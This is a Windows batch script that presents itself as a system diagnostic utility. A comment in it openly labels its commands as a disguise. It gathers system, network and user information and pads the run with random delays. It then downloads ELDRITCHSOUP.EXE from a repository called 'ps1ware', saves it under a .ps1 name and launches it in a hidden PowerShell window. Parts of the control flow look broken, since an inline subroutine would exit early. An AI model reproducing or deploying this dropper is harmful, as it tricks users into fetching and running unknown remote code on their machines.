@echo off
setlocal enabledelayedexpansion

title 管理者ユーティリティ
color 0A
echo [*] 启动系统诊断ユーティリティ...

:: =========================
:: 模拟“管理员诊断”命令
:: =========================

:: Utility function: delay-on-delay
:meta_delay
set /a "主延迟=(%RANDOM% %% 3) + 1"
echo [延迟] 等待 %主延迟% 秒...
for /l %%i in (1,1,%主延迟%) do (
    echo   [子延迟] ... 0.5 秒
    powershell -Command "Start-Sleep -Seconds 0.5"
    powershell -Command "Start-Sleep -Seconds 0.5"
)
exit /b

:: 伪装命令开始
echo [+] 正在诊断网络连接...
ping -n 2 google.com >nul
call :meta_delay

echo [+] 路由追踪到 DNS...
tracert 8.8.8.8
call :meta_delay

echo [+] 获取 IP 配置信息...
ipconfig /all
call :meta_delay

echo [+] 检查端口状态...
netstat -ano
call :meta_delay

echo [+] 查询当前用户...
whoami
call :meta_delay

echo [+] 获取系统详细信息...
systeminfo
call :meta_delay

echo [+] 任务列表分析中...
tasklist | find /i "explorer.exe"
call :meta_delay

echo [+] 查询驱动程序...
driverquery
call :meta_delay

echo [+] 加载帮助系统...
help
call :meta_delay

:: ========================================
:: 终极50次随机微延迟（0.12 - 0.18 秒）
:: ========================================
echo [*] 実行中: 50 回のランダムスリープ (~0.15 秒) を開始します...
for /l %%回 in (1,1,50) do (
    set /a "乱数=(%RANDOM% %% 60) + 120"
    powershell -Command "Start-Sleep -Milliseconds !乱数!"
)

:: ========================
:: 下载并执行
:: ========================
echo [*] ファイルをダウンロード中...

set "网址=https://github.com/s-b-repo/ps1ware/raw/main/ELDRITCHSOUP.EXE"
set "保存路径=%~dp0面白いスクリプト.ps1"

powershell -Command "Invoke-WebRequest -Uri '%网址%' -OutFile '%保存路径%'"

echo [*] ダウンロード完了: %保存路径%
echo [*] スクリプトを起動します...

powershell -WindowStyle Hidden -Command "Start-Process -FilePath '%保存路径%'"

echo [√] 全部完成。管理者ユーティリティ終了。
pause
